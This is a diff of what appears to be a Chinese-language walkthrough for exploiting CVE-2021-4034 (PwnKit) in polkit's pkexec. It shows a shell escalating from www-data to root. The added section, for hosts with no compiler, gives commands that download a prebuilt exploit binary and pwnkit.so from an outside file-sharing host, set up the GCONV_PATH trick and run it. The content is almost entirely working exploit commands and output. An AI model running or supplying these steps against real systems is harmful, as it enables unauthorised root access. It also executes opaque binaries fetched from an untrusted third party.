@@ -105,8 +105,7 @@ remote: Counting objects: 100% (36/36), done.
 remote: Compressing objects: 100% (17/17), done.        
 remote: Total 92 (delta 24), reused 19 (delta 19), pack-reused 56        
 Unpacking objects: 100% (92/92), done.
-/tmp$ cd CVE*
-cd CVE*
+/tmp$ cd CVE-2021-4034
 /tmp/CVE-2021-4034$ ls
 ls
 cve-2021-4034.c   dry-run  Makefile  README.md
@@ -129,6 +128,27 @@ www-data
 # whoami
 whoami
 root
+```
+
+如果没有编译环境
+
+```bash
+/tmp$ git clone https://github.com/berdav/CVE-2021-4034
+/tmp$ cd CVE-2021-4034
+/tmp/CVE-2021-4034$ 
+
+
+wget https://pan.iihack.com/d/CVE/cve-2021-4034
+wget https://pan.iihack.com/d/CVE/cve-2021-4034/pwnkit.so
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /bin/true GCONV_PATH=./pwnkit.so:.
+chmod +x cve-2021-4034
+./cve-2021-4034
+
+
+whoami
+
 ```
 
 
